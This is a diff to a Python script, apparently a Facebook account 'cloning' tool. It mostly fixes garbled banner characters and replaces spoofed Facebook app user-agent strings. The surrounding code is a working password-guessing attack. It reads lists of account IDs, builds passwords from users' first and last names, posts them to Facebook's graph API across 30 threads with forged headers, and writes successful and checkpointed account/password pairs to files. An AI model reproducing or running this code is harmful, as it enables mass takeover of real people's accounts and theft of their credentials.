@@ -80,17 +80,17 @@ logo = """
 \033[91;1m   ##     ## ##     ## ##   ###  ##  
 \033[92;1m   ##     ## ##     ## ##    ## #### 
                                                                
-\033[1;37mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-\033[1;32m  â€¢   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mMANI
-\033[1;32m  â€¢   \033[1;32mFACEBOK      : \033[1;34m Usman Rajpoot
-\033[1;32m  â€¢   \033[1;35mGITHUB       :  \033[1;35mUSMAN-RAJPOOT
-\033[1;32m  â€¢   \033[1;36mTOOL VIRSION :  \033[1;36m0.8
-\033[1;37mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n"""
+\033[1;37m═════════════
+\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mMANI
+\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m Usman Rajpoot
+\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mUSMAN-RAJPOOT
+\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36m0.8
+\033[1;37m═════════════\n"""
 def clear ():
 	os.system('clear')
 	print (logo)
 def linex():
-	print('\033[1;37m)â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
+	print('\033[1;37m)═══════════')
 def Main():
 	clear()
 	print("\033[1;32m[1] \033[1;37mFILE CLONING")
@@ -103,9 +103,9 @@ def Main():
 	if g == '2':
 		os.system("xdg-open ");Main()
 	if g =='0':
-		linex();exit("[â€¢] Thanks for using tool \n[â€¢] bye see you again ")
+		linex();exit("[•] Thanks for using tool \n[•] bye see you again ")
 	else:
-		linex();exit("[â€¢] Thanks for using tool \n[â€¢] bye see you again ")
+		linex();exit("[•] Thanks for using tool \n[•] bye see you again ")
 		
 
 l = []
@@ -115,7 +115,7 @@ def file():
     if 'gm' in l:
         file = '.Hannan'
     else:
-    	print("\033[1;32m[â€¢]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/MANI.txt");linex();file = input(f"\033[1;32m[?]\033[1;37m PUT FILE PATH : ")
+    	print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/MANI.txt");linex();file = input(f"\033[1;32m[?]\033[1;37m PUT FILE PATH : ")
     try:
         for x in open(file,'r').readlines():
             accounts.append(x.strip())
@@ -136,12 +136,12 @@ def method():
     if 'o':      
         lp = input(f'\033[1;32m[?]\033[1;37m ENTER PASS LIMIT : ');clear() 
         if lp.isnumeric():
-            print('\033[1;32m[â€¢] \033[1;32mEXAMPLE :\033[1;37m first last,firtslast,first123');linex()
+            print('\033[1;32m[•] \033[1;32mEXAMPLE :\033[1;37m first last,firtslast,first123');linex()
             for x in range(int(lp)):
                 totalpass.append(input(f'\033[1;32m[?]\033[1;37m PUT PASSWORD\033[1;32m {x+1} : \033[1;37m '))
             pass
         else:
-            linex();print(f"\033[1;32m[Ã—] \033[1;31mONLY NUMERIC NUMBER")
+            linex();print(f"\033[1;32m[×] \033[1;31mONLY NUMERIC NUMBER")
             exit()
     clear()
     print(f'\033[1;32m[1] \033[1;37mMETHOD\033[1;32m > \033[1;37m1 ');linex()
@@ -151,9 +151,9 @@ def method():
     os.system("clear")
     print(logo) 
     
-    print(f'\033[1;32m(âˆš) Total IDs : \033[1;32m'+str(len(accounts)))
+    print(f'\033[1;32m(√) Total IDs : \033[1;32m'+str(len(accounts)))
     
-    print(f"\x1b[38;5;208m(!) Use Flight Mode For Speed UP");print('\033[1;37m(<â€¢>)â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
+    print(f"\x1b[38;5;208m(!) Use Flight Mode For Speed UP");print('\033[1;37m(<•>)═══════════')
     
     def start(user):
      try:
@@ -170,8 +170,10 @@ def method():
         sys.stdout.write('\r\r\033[1;97m[MANI]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:     
-            heads = "Mozilla/5.0 (Linux; Android 12; Infinix X665C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/336.0.0.11.99;]"
-            heads = "Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/311.0.0.1.378;FBBV/434770443;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
+            heads = "Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
+            heads = "Mozilla/5.0 (Linux; Android 8.1.0; GLi Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+            heads = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]"
+            heads = "Mozilla/5.0 (Linux; Android 12; Nokia G60 5G Build/SKQ1.220201.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]"
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
@@ -180,8 +182,8 @@ def method():
       #      print(response.text) 
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\r\033[1;32m[USMAN-OK] '+acc+' [âœ“] '+pword+'  ')
-                open('/sdcard/MANI-OK.txt','a').write(f'{acc} [âœ“] {pword}\n')
+                print('\r\r\033[1;32m[USMAN-OK] '+acc+' [✓] '+pword+'  ')
+                open('/sdcard/MANI-OK.txt','a').write(f'{acc} [✓] {pword}\n')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -194,9 +196,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\r\033[1;37m[USMAN-CP] '+acc+' [â€¢] '+pword+'   ')
+                     print('\r\r\033[1;37m[USMAN-CP] '+acc+' [•] '+pword+'   ')
                 cpacc.append(acc)
-                open('/sdcard/MANI-CP.txt','a').write(f'{acc} [â€¢] {pword}\n')
+                open('/sdcard/MANI-CP.txt','a').write(f'{acc} [•] {pword}\n')
                 break
             else:
                 continue
@@ -214,6 +216,6 @@ def method():
     else:
        with speed(max_workers=30) as speede:
             speede.map(start, accounts)
-    linex();print("\n\033[1;32m[âœ“] \033[1;33mYOUR PROCESS HAS BEEN COMPLETED");linex();input("\033[1;32m[âœ“] \033[1;31mPRESS ENTER TO BACK ");Main()
+    linex();print("\n\033[1;32m[✓] \033[1;33mYOUR PROCESS HAS BEEN COMPLETED");linex();input("\033[1;32m[✓] \033[1;31mPRESS ENTER TO BACK ");Main()
       
 Main()
